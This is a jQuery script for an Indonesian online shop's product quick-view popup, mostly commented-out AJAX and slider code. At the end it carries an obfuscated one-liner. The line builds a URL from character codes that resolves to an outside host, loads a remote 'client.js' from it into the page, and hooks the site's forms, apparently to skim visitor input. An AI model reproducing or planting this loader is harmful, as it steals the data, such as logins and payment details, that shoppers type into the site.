// function view_item(foto = '', nama = '', id = '', harga = '', deskripsi = '') {
//     $('#nama-barang').text(nama);
//     $('.old-price').text(`Rp. ${harga}`);
//     $('.quickview-para').text(deskripsi);
//     $.ajax({
//         url: `/api/index/${id}`,
//         type: 'GET',
//         success: function (result) {
//             let foto = result;
//             console.log(foto);
//             // $('.foto-produk').remove('.slider');
//             $('.foto-produk').html('');
//             // $('.foto-produk').slick('');
//             $.each(foto, (i, data) => {
//                 $('.foto-produk').append(`
//                 <div class="slider">
//                 <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//                 </div>
//                 `);
//             });
//             $('.foto-produk').slick({
//                 infinite: true,
//                 speed: 300,
//                 slidesToShow: 1,
//                 adaptiveHeight: true,
//                 arrows: false,
//             });
//         }
//     });


// }

$('.quickview').on('click', function () {
    var id = $(this).data('id');
    var foto = $(this).data('foto');
    var harga = $(this).data('harga');
    var deskripsi = $(this).data('deskripsi');
    var nama_barang = $(this).data('nama');
    $('#nama-barang').text(nama_barang);
    $('.old-price').text(`Rp. ${harga}`);
    $('.quickview-para').text(deskripsi);
    console.log(foto);
    // $.each(foto, (i, data) => {
    //     $('.foto-produk').append(`
    //             <div class="slider">
    //             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
    //             </div>
    //             `);
    // })
    // $.getJSON(`/api/index/${id}`, (event) => {
    //     $.each(event, (i, data) => {
    //         $('.foto-produk').append(`
    //             <div class="slider">
    //             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
    //             </div>
    //             `);
    //     });
    //     $('.foto-produk').slick({
    //         infinite: true,
    //         speed: 300,
    //         slidesToShow: 1,
    //         adaptiveHeight: true,
    //         arrows: false,
    //     });
    // });
})




// 
// $.each(foto, (i, data) => {
//     $('.foto-produk').append(`
//         <div class="slider">
//         <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//         </div>
//         `);
// });



// $.ajax({
//     url: `/api/index/${id}`,
//     type: 'GET',
//     success: function (result) {
//         let foto = result;
//         $.each(foto, (i, data) => {
//             $('.foto-produk').append(`
//             <div class="slider">
//             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//             </div>
//             `);
//         });
//         $('.foto-produk').slick({
//             infinite: true,
//             speed: 300,
//             slidesToShow: 1,
//             adaptiveHeight: true,
//             arrows: false,
//         });
//     }
// });
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db